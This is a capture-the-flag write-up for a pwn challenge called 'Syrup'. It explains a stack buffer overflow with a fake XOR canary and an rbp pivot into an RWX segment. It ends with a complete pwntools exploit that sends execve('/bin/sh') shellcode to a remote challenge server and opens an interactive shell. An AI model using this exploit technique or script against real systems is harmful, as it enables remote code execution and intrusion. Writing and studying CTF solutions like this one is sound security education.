# Syrup

Binary's a little wacky, let's look into it.

There's no libc used whatsoever, everything is syscalls.

When the binary starts, it calls the \_start function. This function is simple, it uses sys\_write to print out "Can you pwn me?", then calls fn1, then jumps to the function nope.

Let's disassemble fn1. sets rax to the xor of 0xbeef and 0xdead, and pushes this onto the stack.

It then moves rbp to be rsp-0x400, and reads 0x800 bytes from stdin at rbp. Afterwards, it pops rax off of the stack, XORs it with 0xbeef, and checks if the value is 0xdead.

If not, it jumps to the nope function. Otherwise, it rets, popping rbp off the stack before hand

This creates a simple buffer overflow. At the time of our input, the stack looks like this

rbp 0x400 bytes rsp -&gt; value to be popped into RAX value to be popped into RBP return address previous stack frame

we can overflow with 0x400 bytes of padding, and then the value of 0xdead ^ 0xbeef.

The binary has no protections whatsoever, including lack of NX.

There is a RWX segment within the binary. Because fn1 uses rbp to mark where it starts its input, and we get a pop into rbp, we can set rbp to be the address of the RWX segment, and then ret into the instruction in fn1 that starts the input. Then, we enter shellcode, and ret to that address. Script below. \(I wrote custom shellcode that uses the fact that /bin/sh is written just before it\)

```python
from pwn import *
rax = 0xdead ^ 0xbeef
e = ELF("./syrup")
payload = b'A' * 0x400 + flat(rax,0x402000, 0x000000000040105d,rax,b'B' * 8, 0x402000+8, word_size=64)
#p = e.process()
p = remote('jh2i.com', 50036)
p.recvline()
pause()
p.sendline(payload)
p.clean()
#Send shellcode
shellcode = asm("mov rdi,0x402000 ; mov rsi,0 ; mov rdx,0 ; mov rax,0x3b ; syscall", arch='amd64')
pause()
p.sendline(b"/bin/sh\x00" + shellcode)
p.interactive()
`
```

